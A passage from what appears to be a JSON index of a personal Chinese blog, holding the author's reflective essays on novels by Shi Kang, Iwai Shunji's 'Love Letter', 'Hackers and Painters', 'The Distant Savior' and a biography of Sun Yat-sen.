有独立思考的能力 质疑一切 有逻辑 能轻易看清现实世界的虚伪和矛盾，但自己也免不了虚伪和矛盾 有文化的流氓 骨子里的高傲和自负，对自己的分析和判断有很强的执念，能接纳新想法但很快就把新想法溶到自己的体系里。将将自洽，说服了自己又巧舌如簧地企图说服别人。 热衷于生命的真相，不断的确认，然后否定。终究是困惑。 坦诚。皮厚。达观。透彻。 希望进入上层社会的渴望与求之不得的无奈与随之而来的不屑。 爱真理又意识到了真理可能不存在。于是选择沉沦。但他天生善良，做不成彻底的坏人，所以只是嘴上说说书里写写偶尔试试。他还是去爱那令他无比困惑和痛苦的真相或已幻灭的人生。 这是一个生具灵性，求道未得，战天斗地，睥睨先贤的勇士，也是一个孤独无助，进退维谷，曲高和寡，强颜欢笑的普通人。 我尊敬他。 祝他生活愉快。 //这是个人从石康书中读出的石康，也或许只是是自己想象中的某个形象，主观臆断，言语偏颇，见谅。分享一二，但求指摘。 https://www.zhihu.com/question/23669560/answer/98330703 石康在一塌糊涂中多次强调自己能力不足以干大事，这也许源于他不自知的自卑，或许源于他透彻的自我解剖。但是实际上，一个人是无法完全认清自己的。我也很期待多少年后某一天，我听说石康，在某个名利场中一举拔得头筹，举世喝彩。虽然我们都知道这毫无意义，但还是蛮有意思的吧。\n和以往两次一样，寂寞而迷茫的周文到处嗅蜜，也就是撩妹。周文虽有嘴皮，但社会背景不优，圈子小且简陋，关键是没有钱，所以成果总是不尽如人意。而且周文的价值体系里没有忠贞这两个字，他嗅蜜总不容易，但也从不珍惜。也许是本性所致，也许是太爱思考的缘故，他可能珍惜不起来。不管怎样，这次的女孩叫嗡嗡，爱撒娇，一年后的千禧年前夕，他们掰了。然后在继对道德、宗教、信念、真善美、自由意志、意识等感到绝望之后，周文抑或是石康终于放弃从爱情中寻找人生真相的慰藉。\n文中处处，我看到一草《那时年少》的痕迹。他们都说，那时，有个女孩，相信有一种感情使人们永远在一起并且不会改变，但他们自己不相信，一草说，他撒了谎，石康说他不爱撒谎。但不论如何，在千禧年前后，苏扬和童小语，周文和嗡嗡，他们之间，结束了实质上的联系，而随之结束的是青春里的纯真和对爱情的信赖。\n我没有体验过，只是觉得那很悲壮，或许我的信念只将在呜咽一声过后悄然湮灭，了无踪迹。\n石康觉得自己很牛逼，整个文明史整了一遍后高声宣布：我最屌，他们都是傻逼。但在残酷的物质生活的直接压迫下，他也还是承认：我有些无能。其实，我虽然还未看遍文明史，但有时我又何尝不是处于这种矛盾的心理状态呢。\n对于石康，我很欣赏，但也觉得可悲。对我自己，也是一样。如果有命运，我不知道命运会给这一类人什么出路。我们拭目以待吧，如果值得的话。\n2016.5.1 于厦大\n2017.8.30 凌晨 整理 于厦大\n","permalink":"https://ret2neo.cn/mind/160501yitahutu/","summary":"《一塌糊涂》 在继《晃晃悠悠》、《支离破碎》之后，我终于花了一整天时间完成了对石康青春三部曲中最后一部《一塌糊涂》的阅读。今天是二零一六年的劳动节，图书馆关了门，自习室少有人，大家都忙着去寻找乐趣了，然而于我而言，这一天与以往或是将来的任何一天不会有太大的分别。我在无所事事的心境下游荡，徘徊，找着一件能消磨时光又不那么令人厌恶的事情，一头扎进去，待到红日又西沉，感慨江水常东流。其实也算不得一整天。昨夜打球过度，回宿舍后疲惫不堪，甚至洗完澡也没有丝毫缓解，又作死与舍友一同订了双鸡堡与大鸡排。一行四人开着无关痛痒的玩笑，逗着重复而无新意的段子，偶尔冒出一两句有些愚蠢的俏皮话，一派其乐融融的景象。我不知道他们作何感想，反正我是感到极大的无趣，我不过是怕他们觉得无话可说的尴尬，若是独处，我是情愿终日无言的。吃过鸡排和汉堡，这垃圾食品满足了我短暂的口腹之欲，却在过后令我腹中有火烧之感，加上身体疲惫，不适感前所未有。吹干头发后连忙上床，企图通过睡眠缓解或是弥补这一切。说来睡眠真是好东西，它让我们耗散的精力得以填补，以此能够开始新的一日更加肆无忌惮、不知死活的耗散。有时睡醒后我总会想起王小波那句“以为自己会一直生猛下去”。其实我很难想象，但还是有些担心自己不能再生猛，不能再在打球时把地板跺得很响。嗯，虽然那种不适令我难以入眠，但没过多久，我还是睡着了。醒来已是九点半，我顿时被一种无所事事的感觉袭满全身。我不知道自己要干什么，要去哪里，我的价值在何处，我甚至无法确定自己的天赋。我只能看书，看各种书，或电影。企图从中找到一丝启发，一点安慰也好，渐渐的我发现那都没有什么用。我看得很慢，但忘得很快，我看到作者同我一样混乱的思路，不得要领的分析和草率的结论。也就是说，我基本一无所获。但我怎么会甘心呢，我还是得看啊，我得不断地试错。\n于是一番来回走动后已是十二点多，我背上大书包，抄上《一塌糊涂》便踱着懒散的步子出发了。我打算先吃个饱饭来满足我的身体，再找个安静的地方安慰一下我的灵魂。我走在路上。路上人很少，我看到天空、白云、柏油路、绿树、青草、高大的建筑，我闻到花香、空气和美女。我走在路上，脑子里空空荡荡。我吃了个饭，脑子里空空荡荡。我现在看完了书，有很多想法捆在一起，毫无头绪，还不如空空荡荡。我这状态很糟，但我不希望别人觉得我亟待拯救或亟须向积极的方向改变。我执着地期待着，我应该有自己的出路。\n石康在三十二岁左右，即二零零零年前后完成了三部曲的最后一部《一塌糊涂》。他说自己要把三部曲撕碎，抛在风中，并且到俗世里争取他应有的地位，去证明他应有的价值。而今十数年过去了，我不知道他近况如何，作何感想。是否在那一堆他看不上的人群中谋得一席之地。据说他近来出国了，希望他过得好吧。\n其实本质上石康和我很相像，我总能在书中感受到一些似曾相识的想法或是一些还在孕育中的感悟。所以许多时候，我在阅读他时有种酣畅淋漓的快感。他出身普通，但热忱。我在完整地阅读过他的三部曲后对他的印象有了一个大致的概括。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 如何评价石康？ 东郭热，人生如逆旅，我亦是行人。 对世界彻底的悲观失望以及自认为看清一切后的无所事事的晃晃悠悠状态下的上进与热爱生活 有独立思考的能力 质疑一切 有逻辑 能轻易看清现实世界的虚伪和矛盾，但自己也免不了虚伪和矛盾 有文化的流氓 骨子里的高傲和自负，对自己的分析和判断有很强的执念，能接纳新想法但很快就把新想法溶到自己的体系里。将将自洽，说服了自己又巧舌如簧地企图说服别人。 热衷于生命的真相，不断的确认，然后否定。终究是困惑。 坦诚。皮厚。达观。透彻。 希望进入上层社会的渴望与求之不得的无奈与随之而来的不屑。 爱真理又意识到了真理可能不存在。于是选择沉沦。但他天生善良，做不成彻底的坏人，所以只是嘴上说说书里写写偶尔试试。他还是去爱那令他无比困惑和痛苦的真相或已幻灭的人生。 这是一个生具灵性，求道未得，战天斗地，睥睨先贤的勇士，也是一个孤独无助，进退维谷，曲高和寡，强颜欢笑的普通人。 我尊敬他。 祝他生活愉快。 //这是个人从石康书中读出的石康，也或许只是是自己想象中的某个形象，主观臆断，言语偏颇，见谅。分享一二，但求指摘。 https://www.zhihu.com/question/23669560/answer/98330703 石康在一塌糊涂中多次强调自己能力不足以干大事，这也许源于他不自知的自卑，或许源于他透彻的自我解剖。但是实际上，一个人是无法完全认清自己的。我也很期待多少年后某一天，我听说石康，在某个名利场中一举拔得头筹，举世喝彩。虽然我们都知道这毫无意义，但还是蛮有意思的吧。\n和以往两次一样，寂寞而迷茫的周文到处嗅蜜，也就是撩妹。周文虽有嘴皮，但社会背景不优，圈子小且简陋，关键是没有钱，所以成果总是不尽如人意。而且周文的价值体系里没有忠贞这两个字，他嗅蜜总不容易，但也从不珍惜。也许是本性所致，也许是太爱思考的缘故，他可能珍惜不起来。不管怎样，这次的女孩叫嗡嗡，爱撒娇，一年后的千禧年前夕，他们掰了。然后在继对道德、宗教、信念、真善美、自由意志、意识等感到绝望之后，周文抑或是石康终于放弃从爱情中寻找人生真相的慰藉。\n文中处处，我看到一草《那时年少》的痕迹。他们都说，那时，有个女孩，相信有一种感情使人们永远在一起并且不会改变，但他们自己不相信，一草说，他撒了谎，石康说他不爱撒谎。但不论如何，在千禧年前后，苏扬和童小语，周文和嗡嗡，他们之间，结束了实质上的联系，而随之结束的是青春里的纯真和对爱情的信赖。\n我没有体验过，只是觉得那很悲壮，或许我的信念只将在呜咽一声过后悄然湮灭，了无踪迹。\n石康觉得自己很牛逼，整个文明史整了一遍后高声宣布：我最屌，他们都是傻逼。但在残酷的物质生活的直接压迫下，他也还是承认：我有些无能。其实，我虽然还未看遍文明史，但有时我又何尝不是处于这种矛盾的心理状态呢。\n对于石康，我很欣赏，但也觉得可悲。对我自己，也是一样。如果有命运，我不知道命运会给这一类人什么出路。我们拭目以待吧，如果值得的话。\n2016.5.1 于厦大\n2017.8.30 凌晨 整理 于厦大","title":"《一塌糊涂》"},{"content":"我想问问有什么值得追求？ 昨天夜里十一时许，我在厦门大学上弦场完成了《黑客与画家》一书的阅读。彼时圆月当空，雾霾颇浓，四下人烟稀少，周遭空旷寂寥。我忽然觉得有点悲伤。想找一中问问，找南怀瑾问问，找佛陀问问，找老子问问，找庄子问问，找尼采问问，我这一生，究竟有什么值得追求？我不知道，真的不知道。\n可其实我也知道，只是问问罢了。哪里有什么答案呢。一切真切地展现在我面前，了无意义，万般终成空。所唯一能做的，就是找一样物事，或某一个人，或一个念头，或某一种关系，沉醉进去，荒唐下去，以此终老。慢慢的，或许不甘，或许执着，最终要妥协。\n如果有，或许技术算一种吧，但终归不那么热烈。\n作者拥有独立的人格，这是应当学习的。在阅读的过程中给了我不少启迪。关于教育，关于思考，关于追求，他都有很独到的见解。这或许需要很长时间，很多的经历才有可能真正的了解，毕竟纸上得来终觉浅。我就是想的太多，做的太少吧。\n近来感觉越发的辞不达意，言不成章，不知是浮躁了还是迷失了。可我一直都是浮躁和迷失的呀。那到底是怎么了呢？搞不懂。思来想去的有许多东西，可是下手写的时候却不知从何说起。我有时觉得他们所有人都很糟，有时觉得自己很糟，总之很少发现什么好的，这真像是一种病。为什么大多数人看起来都蛮开心的，他们没有困惑吗，还是他们解决了。为什么独独我常觉得失落，独独我难以走进人群呢？\n大多数时候我享受一个人，但有时我承认我感到寂寞，这可以忍受，独独难以忍受的是我所追求的看起来没有答案。\n我不知道我还能坚持多久，但我确实在一点点离开自己的理想国度。我想走近生活，抛弃那个高傲冷漠的自己，也许我能走近，也许不能，也许我会明白，也许我会迷失，但无论如何，回来的都不再是我了。\n——————————————不知道写什么了。。。。。黑客与画家是我很愿意推荐的一本书 有空看看吧——\u0026mdash;就酱 夜深了 晚安世界 晚安阿威\n","permalink":"https://ret2neo.cn/mind/160430hackerandpainter/","summary":"我想问问有什么值得追求？ 昨天夜里十一时许，我在厦门大学上弦场完成了《黑客与画家》一书的阅读。彼时圆月当空，雾霾颇浓，四下人烟稀少，周遭空旷寂寥。我忽然觉得有点悲伤。想找一中问问，找南怀瑾问问，找佛陀问问，找老子问问，找庄子问问，找尼采问问，我这一生，究竟有什么值得追求？我不知道，真的不知道。\n可其实我也知道，只是问问罢了。哪里有什么答案呢。一切真切地展现在我面前，了无意义，万般终成空。所唯一能做的，就是找一样物事，或某一个人，或一个念头，或某一种关系，沉醉进去，荒唐下去，以此终老。慢慢的，或许不甘，或许执着，最终要妥协。\n如果有，或许技术算一种吧，但终归不那么热烈。\n作者拥有独立的人格，这是应当学习的。在阅读的过程中给了我不少启迪。关于教育，关于思考，关于追求，他都有很独到的见解。这或许需要很长时间，很多的经历才有可能真正的了解，毕竟纸上得来终觉浅。我就是想的太多，做的太少吧。\n近来感觉越发的辞不达意，言不成章，不知是浮躁了还是迷失了。可我一直都是浮躁和迷失的呀。那到底是怎么了呢？搞不懂。思来想去的有许多东西，可是下手写的时候却不知从何说起。我有时觉得他们所有人都很糟，有时觉得自己很糟，总之很少发现什么好的，这真像是一种病。为什么大多数人看起来都蛮开心的，他们没有困惑吗，还是他们解决了。为什么独独我常觉得失落，独独我难以走进人群呢？\n大多数时候我享受一个人，但有时我承认我感到寂寞，这可以忍受，独独难以忍受的是我所追求的看起来没有答案。\n我不知道我还能坚持多久，但我确实在一点点离开自己的理想国度。我想走近生活，抛弃那个高傲冷漠的自己，也许我能走近，也许不能，也许我会明白，也许我会迷失，但无论如何，回来的都不再是我了。\n——————————————不知道写什么了。。。。。黑客与画家是我很愿意推荐的一本书 有空看看吧——\u0026mdash;就酱 夜深了 晚安世界 晚安阿威","title":"《黑客与画家》"},{"content":"天下何时为公 曩路遇老叟，皮皱发白，手足不便，惟目神炯炯。同车而行，吾见其好自语，絮絮不止。遂移坐，近之以私听。虽词句杂然，未贯而成章，吾稍得大旨。盖感于时世之明，当朝之治，青年之多能，复叹于昔时之落后，彼年生计之艰，国力之衰，并技术之穷乏。由是数称非孙文之革新无今日之中国，孙公真贤士也。吾一心阴听，不觉俯身倾耳，为叟所察，自觉失礼，手足口失其所安。不意老叟不吾怪，反执吾手，眉目慈蔼，类极祖考，一时心乱。内之愈乱，则外须愈静。吾亦不致歉，展萌态以对之，直视其目之炯炯。俄而叟曰:尔辈当多读中山之作，悉其大义，扬其明旨，成其伟业。言毕复絮絮自语，若从前状。\n今幸有暇，寻其传记以拜读，有二三感，且一发而后快。\n孙文，又名中山，德明，逸仙，曾化名中山樵，高野长雄，中山二郎等。或曰“天子命”，遂幼名帝象。果命由天定，运在自为，孙公存世一甲子，虽位近天子，然则命途多舛，终不得享其成，虽威扬天下，终止于国之公器，不得帝王四海，尽遂其愿。中山之鹄的固不在帝位，然则非帝王不能成易四海之事，非帝王不能改苍生之命，非帝王不能开愚民之智。人之所以伟者，在于众皆从之。伟人之所以成事者，在于众皆恒从之而无疑。欲使无疑，一曰权，二曰智。权须天赋，苍生俯首，智须神来，天下为虏。权易得而智难求，非权无以广智，非智无以成权，夫惟权、智具足，可成万古不刊之大业。此亦润之之所以王而中山之所以寇者也。\n文幼有将帅之好，常自诩“洪秀全”，率群童模拟征战，野心初显，此类极拿破仑，盖斯属之人志悉发于少。十三岁出国投兄孙眉，有“始见轮舟之奇，沧海之阔，自是有慕西学之心，穷天地之想”之感。此年少之志，终不得践，西学有成而天地不可穷。西学亦不足以为穷天地之资。以故其半生飘零，似无头蝇，作意气事，败垂成功。二十六岁前，为学长才。此后二十年间，旅居海外，三民之论渐成体系，力彰己见，扬其名氏共思虑于四海，所凭惟口舌之利与不懈之心。欧美驱逐，伦敦蒙难，流离颠沛，其实可哀，而民智得稍启，有士同揭竿，亦足可慰。四十五岁，武昌起义，孙文坐食其果，所仗亦廿载飘零广告之功，彼时天下，舍文其谁？此乘天时也。\n孙文素好毁其旧者，若夫何以建其新者，则思虑天真，略乏才智。向所欲毁者骤毁于前，文睹其残垣，不知何以立。破立之道，更迭之本也。破之易而立之难也。呕心沥血，寤寐难眠，不足以立，遂孙文拱手强权，袁贼取天下以反掌。天意使文徒具打砸之勇而无帝王之才，天意使黎民一场空喜，惨蒙驱虎引狼之灾，吾实痛心而不可奈何。一念误而添十年劳，亦必时之未至也。文终于草寇一生，天位留予后来人。\n观文之生平，真可谓为国为民，鞠躬尽瘁。虽功不可没，吾为之一叹。其功在启民智，而不在易江山，卸磨，杀之。哽咽无言，亦复向之叹息，人皆为时、运、命所虏，不能自已，其实可哀。\n吾以为，民智可开否诚不可知。苟可期，民智之开亦必速在庠序之教。民智得开则旧陈得破，贤者之聪方可立新。民智，贤者皆不易具，吾疑天下犹不系之舟，诚可怖也，实大惑也。破立之事，可速为乎？破立往复，可有不破之立？抑或不立之破？吾生而有涯，破立有涯乎？有径乎？皆尚不可知也。\n吾亦时有穷天地之想，然则天地何在？前路莫非穷途？\n乙未年十一月\n","permalink":"https://ret2neo.cn/mind/160421peopleworld/","summary":"天下何时为公 曩路遇老叟，皮皱发白，手足不便，惟目神炯炯。同车而行，吾见其好自语，絮絮不止。遂移坐，近之以私听。虽词句杂然，未贯而成章，吾稍得大旨。盖感于时世之明，当朝之治，青年之多能，复叹于昔时之落后，彼年生计之艰，国力之衰，并技术之穷乏。由是数称非孙文之革新无今日之中国，孙公真贤士也。吾一心阴听，不觉俯身倾耳，为叟所察，自觉失礼，手足口失其所安。不意老叟不吾怪，反执吾手，眉目慈蔼，类极祖考，一时心乱。内之愈乱，则外须愈静。吾亦不致歉，展萌态以对之，直视其目之炯炯。俄而叟曰:尔辈当多读中山之作，悉其大义，扬其明旨，成其伟业。言毕复絮絮自语，若从前状。\n今幸有暇，寻其传记以拜读，有二三感，且一发而后快。\n孙文，又名中山，德明，逸仙，曾化名中山樵，高野长雄，中山二郎等。或曰“天子命”，遂幼名帝象。果命由天定，运在自为，孙公存世一甲子，虽位近天子，然则命途多舛，终不得享其成，虽威扬天下，终止于国之公器，不得帝王四海，尽遂其愿。中山之鹄的固不在帝位，然则非帝王不能成易四海之事，非帝王不能改苍生之命，非帝王不能开愚民之智。人之所以伟者，在于众皆从之。伟人之所以成事者，在于众皆恒从之而无疑。欲使无疑，一曰权，二曰智。权须天赋，苍生俯首，智须神来，天下为虏。权易得而智难求，非权无以广智，非智无以成权，夫惟权、智具足，可成万古不刊之大业。此亦润之之所以王而中山之所以寇者也。\n文幼有将帅之好，常自诩“洪秀全”，率群童模拟征战，野心初显，此类极拿破仑，盖斯属之人志悉发于少。十三岁出国投兄孙眉，有“始见轮舟之奇，沧海之阔，自是有慕西学之心，穷天地之想”之感。此年少之志，终不得践，西学有成而天地不可穷。西学亦不足以为穷天地之资。以故其半生飘零，似无头蝇，作意气事，败垂成功。二十六岁前，为学长才。此后二十年间，旅居海外，三民之论渐成体系，力彰己见，扬其名氏共思虑于四海，所凭惟口舌之利与不懈之心。欧美驱逐，伦敦蒙难，流离颠沛，其实可哀，而民智得稍启，有士同揭竿，亦足可慰。四十五岁，武昌起义，孙文坐食其果，所仗亦廿载飘零广告之功，彼时天下，舍文其谁？此乘天时也。\n孙文素好毁其旧者，若夫何以建其新者，则思虑天真，略乏才智。向所欲毁者骤毁于前，文睹其残垣，不知何以立。破立之道，更迭之本也。破之易而立之难也。呕心沥血，寤寐难眠，不足以立，遂孙文拱手强权，袁贼取天下以反掌。天意使文徒具打砸之勇而无帝王之才，天意使黎民一场空喜，惨蒙驱虎引狼之灾，吾实痛心而不可奈何。一念误而添十年劳，亦必时之未至也。文终于草寇一生，天位留予后来人。\n观文之生平，真可谓为国为民，鞠躬尽瘁。虽功不可没，吾为之一叹。其功在启民智，而不在易江山，卸磨，杀之。哽咽无言，亦复向之叹息，人皆为时、运、命所虏，不能自已，其实可哀。\n吾以为，民智可开否诚不可知。苟可期，民智之开亦必速在庠序之教。民智得开则旧陈得破，贤者之聪方可立新。民智，贤者皆不易具，吾疑天下犹不系之舟，诚可怖也，实大惑也。破立之事，可速为乎？破立往复，可有不破之立？抑或不立之破？吾生而有涯，破立有涯乎？有径乎？皆尚不可知也。\n吾亦时有穷天地之想，然则天地何在？前路莫非穷途？\n乙未年十一月","title":"《天下为公· 孙中山传》"},{"content":"《晃晃悠悠》+《支离破碎》 ","permalink":"https://ret2neo.cn/mind/160421wanderbroken/","summary":"《晃晃悠悠》+《支离破碎》 ","title":"《晃晃悠悠》+《支离破碎》"},{"content":"遥远的救世主\n在强者与弱者之间，\n自己是一个多余的人！\n在道德与败坏之间，\n自己是一个多余的人！\n世界太大了，\n大得能包容罪恶、阴谋、眼泪……\n世界又太小了，\n小得竟然没有他刘冰的一块立锥之地……\n他爬上窗户，\n既像胜利者又像受了委屈的孩子一样\n对着夜空大声喊道：“丁元英，你撒谎啦！你撒谎啦……”\n然后纵身一跳。\n接着，地面传来一声沉闷的声响。 ——《遥远的救世主》\n本书通过一个主要故事试图向读者展示文化属性对于人生道路的主宰性作用并揭露了中华民族传统文化中倚赖和期待救世主的劣根性。\n男主角是丁元英，一个游刃于经济领域，善于谋算的聪明人，一个精于佛道，追问人生究竟的觉者，一个沉默寡言，畏惧女人，不问功名的退隐者。\n女主角是芮小丹，美女，有慧根，有佛性，也许算是降了丁元英。\n丁从股市退出后到古城隐居，和芮相遇。芮爱上了丁并不顾一切地追求。丁被动地接受。两人讨论文化属性的问题。芮要丁为其写一个神话——帮助县城里的一个极度贫困村脱贫。也以此研究文化属性地优劣是否真的会带来那么巨大的影响。\n丁利用市场竞争的边缘手段酿造了一个阴谋，帮助农民跻身资本市场。三个农村的年轻人作为分别代表这个实验的三个结果——冯世杰，有所觉悟。叶晓明，退回原地。叶冰，从井沿看了一眼更大的世界后掉回去的井底之蛙，同时得了精神绝症，成了这场失败实验的牺牲品，自杀。\n归根结底，他们还是把丁元英看成了救世主，没有明白只有自救方能得救的道理。\n基督教让他们靠上帝，佛教让他们靠佛恩，传统文化给了农民什么？谁来给农民做主？农民的得救之道在哪里？\n丁元英说：“传统文化是皇天在上的文化，是救主、救恩的文化。如果一个民族的文化从骨子里就是弱势文化属性，怎么可能去承载强势文化的政治、经济？衡量一种文化属性不是看它积淀的时间长短，而是看它与客观规律的距离远近。五千年的文化是光辉、是灿烂，这个没有问题。但是，传统和习俗得过过客观规律的筛子。”\n这场实验的失败恰恰验证了丁的另一句话“不该作为的不作为就是作为”。\n得救之道何在，这是个问题。一个一说就错的问题。\n我想作者所说的救世主是客观规律。\n丁元英说：“你自性本来，无需知道。这是根性的范畴，不是根器、智慧。我呢？就在那里参哪参哪，没完没了，越想活个明白就越不明白，一直参到了死胡同里出不来，就蹲在墙根打瞌睡。”\n看来做一个晃晃悠悠的人没什么，只是要有足够的能力在这世间立足便是。\n等我有钱了，就找个地方躲起来。▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁ ☻…☺…☻…☺…☻…☺…☻…☺…▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆\n","permalink":"https://ret2neo.cn/mind/160421farawaychrist/","summary":"遥远的救世主\n在强者与弱者之间，\n自己是一个多余的人！\n在道德与败坏之间，\n自己是一个多余的人！\n世界太大了，\n大得能包容罪恶、阴谋、眼泪……\n世界又太小了，\n小得竟然没有他刘冰的一块立锥之地……\n他爬上窗户，\n既像胜利者又像受了委屈的孩子一样\n对着夜空大声喊道：“丁元英，你撒谎啦！你撒谎啦……”\n然后纵身一跳。\n接着，地面传来一声沉闷的声响。 ——《遥远的救世主》\n本书通过一个主要故事试图向读者展示文化属性对于人生道路的主宰性作用并揭露了中华民族传统文化中倚赖和期待救世主的劣根性。\n男主角是丁元英，一个游刃于经济领域，善于谋算的聪明人，一个精于佛道，追问人生究竟的觉者，一个沉默寡言，畏惧女人，不问功名的退隐者。\n女主角是芮小丹，美女，有慧根，有佛性，也许算是降了丁元英。\n丁从股市退出后到古城隐居，和芮相遇。芮爱上了丁并不顾一切地追求。丁被动地接受。两人讨论文化属性的问题。芮要丁为其写一个神话——帮助县城里的一个极度贫困村脱贫。也以此研究文化属性地优劣是否真的会带来那么巨大的影响。\n丁利用市场竞争的边缘手段酿造了一个阴谋，帮助农民跻身资本市场。三个农村的年轻人作为分别代表这个实验的三个结果——冯世杰，有所觉悟。叶晓明，退回原地。叶冰，从井沿看了一眼更大的世界后掉回去的井底之蛙，同时得了精神绝症，成了这场失败实验的牺牲品，自杀。\n归根结底，他们还是把丁元英看成了救世主，没有明白只有自救方能得救的道理。\n基督教让他们靠上帝，佛教让他们靠佛恩，传统文化给了农民什么？谁来给农民做主？农民的得救之道在哪里？\n丁元英说：“传统文化是皇天在上的文化，是救主、救恩的文化。如果一个民族的文化从骨子里就是弱势文化属性，怎么可能去承载强势文化的政治、经济？衡量一种文化属性不是看它积淀的时间长短，而是看它与客观规律的距离远近。五千年的文化是光辉、是灿烂，这个没有问题。但是，传统和习俗得过过客观规律的筛子。”\n这场实验的失败恰恰验证了丁的另一句话“不该作为的不作为就是作为”。\n得救之道何在，这是个问题。一个一说就错的问题。\n我想作者所说的救世主是客观规律。\n丁元英说：“你自性本来，无需知道。这是根性的范畴，不是根器、智慧。我呢？就在那里参哪参哪，没完没了，越想活个明白就越不明白，一直参到了死胡同里出不来，就蹲在墙根打瞌睡。”\n看来做一个晃晃悠悠的人没什么，只是要有足够的能力在这世间立足便是。\n等我有钱了，就找个地方躲起来。▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆▅▄▃▂▁ ☻…☺…☻…☺…☻…☺…☻…☺…▁▂▃▄▅▆▇█▇▆▅▄▃▂▁▁▂▃▄▅▆▇█▇▆","title":"《遥远的救世主》"},{"content":" ","permalink":"https://ret2neo.cn/mind/160419childking/","summary":" ","title":"《孩子王》"},{"content":"高中时代看一个样貌清秀女孩手捧《情书》在窗边读 ，阳光泻在侧脸，长发如瀑，双肩瘦削，领口的脖颈肤白胜雪，画面太美，不敢多看。然而还是一眼望尽，也立刻记住了岩井俊二这个古怪的日本名字。当时我想，这名字看似逼格颇高，有空我也得读读才成。然而好长一段时间里，再没记起那个场景，今日不知怎的，忽然忆起，打算一读《情书》，权当消磨这心乱如麻的午后。\n剧透的序最惹人厌，读罢整个故事便十分了然，他日我若为人作序，定只说破三分，留七分光景予人想往。看得见结局的开头会败了整个故事的兴味，就像一眼瞧得到头的人生并无多大活头。\n缘起在于一男一女的藤井树，他们是中学同学，因为同名同姓的缘故受同学撮合，女方无甚感觉，而作为“闷蛋”的男方却有些入戏。自然像大多年少的故事一样，这份奇特的缘分无疾而终。可他是足够幸运的，多年后遇上了和女藤井树样貌相似度颇高的博子并且几乎要步入婚姻的殿堂。然而人生诸多时候就是差那么一点点，即便耗尽所有运气也无力回天，男藤井树在婚前的一次登山中意外身亡。三年后博子又将和玻璃匠茂成婚。婚前误将女藤井树的住址当做男藤井树生前住址，与女藤井树有了几次的书信来往，一点点揭开了尘封往事。\n男藤井树是一个看历史和哲学以及《追忆似水年华》的人们眼中古怪的人和女藤井树眼中的“闷蛋”。他无意之中一点点堕入自己编织的情网，后来又悄无声息毅然决然地离开，明面上是对老师同学的“误会”的反抗，实则我料想大概是受不得日复一日的自我煎熬，企图用骄傲的离开换一个从容的背影，用潇洒的远去掩住慌乱的眼神。然而他万万没有料到的是那些闷着的日子里出现过的阳光早已给他的人生打下了不可磨灭的水印，以至于后来的人那样像是从前的替代品，这是一种不负责任的自私，却也是令人动容的真情，值得理解的荒唐。令我愉快的是故事并没有这样走向结局，我很赞同作者，再度离开才是他最好的归宿。\n女藤井树不属于他，博子同样不属于，或许，他和松田圣子比较好一些，毕竟最后的时间里，他没有想到自己的未婚妻博子，甚至也没有想到女藤井树，他只是唱着松田圣子的“我的爱随南风而逝…”，然后告别了这个世界。他的心中，只剩下求不得的苦。这让我不禁想起李宗盛的《山丘》——向情爱的挑逗，命运的左右，不自量力地还手，直至死方休。真是无比真实而残忍的写照。故事的最后，《追忆似水年华》戏剧般地被女藤井树捧在手中，阿树拿着它，无声的看着。上面有一幅清纯、仔细的素描。这是她的脸孔。于男藤井树而言，也算是人生有个圆满的交代，死也值了。\n对比之下，博子的境遇就有些糟糕。毕竟无论于谁，被当做替代品都是对于已经付出的感情的莫大羞辱，也是对于多年念念不忘的真心的无情嘲讽。颇有些“越过山丘，才发现无人等候”的苦楚。然而那又如何，时过境迁，一切都不得不被原谅，怪不得谁，你有心，我也曾愿意。还好生活留给她一个瓦，因害怕失去而如履薄冰地爱着她的瓦。\n这样看来就形成了一个古怪的关系链。真情的瓦爱着对另一个男人念念不忘的博子，痴情的博子无法放下只是将对另一个女人的真心寄托在她身上的男藤井树。女藤井树时隔多年才明白当初那个男孩的炽热，而男孩已经不再，博子事过境迁才了然那个男人的炽热并不为她，而她已无可诉说。博子终将嫁给瓦，生活也终于将所有人糟蹋。\n哈哈，不能原谅却无法阻挡，谁在你心里放冷枪。\n事情常常是这样，一点也抵不过命运的作弄。然而，多年后的一封情书——“阿树，你好吗？我很好”足以无声消融一切。我们终于不再贪恋，不再妒忌，不再感伤，而是相互拥抱，渡过这冰冷的寂寞河流，杀死这刺骨的孤独时光。\n这书短的离奇，看上去停的有些不是时候。我都怀疑自己是不是找到了不全的，可是转念想想，很多事不都这样，在最以为要高潮迭起的时候戛然而止，在最应当细水长流的时候无声湮灭，也许要抱怨生活，也许生活也会无辜地摊开双手，说，你瞧，我什么也没做，都是你们在作啊。\n2015.11.18 附上摘抄: 《情书》摘抄 1.我不知道为什么他这样做，他大概是个闷蛋，无所事事。\n2.她的经历，虽然当时很不愉快，十年后看来，很有趣。\n3.\u0026ldquo;他跌下去后，我尽全力去找他。\u0026ldquo;熊山开始高歌：\u0026ldquo;我的爱随南风而逝……\u0026ldquo;\u0026ldquo;这是你们攀山者常唱的歌？\u0026ldquo;博子问。这是松田圣子的歌。\u0026ldquo;我相信当阿树敞在石下时还唱着这首歌。我听得到。\u0026ldquo;熊山说。 \u0026ldquo;也许阿树当时只是想着松田圣子。\u0026ldquo;博子耸一耸肩。博子和茂决定在熊山的家过夜。\n4.妈很愤怒。\u0026ldquo;你还记得我丈夫怎死的？他患肺炎，那是冬天，是你背他到医院的。太迟了，上次你用了45分钟。我们要等救护车。\u0026ldquo;\u0026ldquo;我只用了30分钟。\u0026ldquo;爷爷坚持：\u0026ldquo;事实上只28分钟，便到了入口。我今晚会再做得到。\u0026ldquo;当爷爷背起树时，妈挡着门口。\u0026ldquo;看，阿树是你的女儿，今晚由你决定。你选择怎做？\u0026ldquo;她知道怎么也阻不了他，所以决定让爷爷去了。风雪越下越大，爷爷背着树，踏过厚雪。他已是七十五岁了，但还很强健。半路中途，他摔倒了，面庞直倒在雪上。\u0026ldquo;你要休息一下了。\u0026ldquo;妈说。\u0026ldquo;不！我们继续！\u0026ldquo;他们花了四十分钟赶到医院，爷爷明显也要医治。医生给他一点氧气。阿树则暂时脱离危险。\n5.茂走前几步用手围着嘴巴，叫声响遍冬日早晨：\u0026ldquo;藤井树，你‥冷‥吗？你还‥唱着‥松田圣子的歌吗？我要‥跟博子‥结婚呀！好‥好‥好！\u0026ldquo;他回头看博子。\u0026ldquo;看见吗？阿树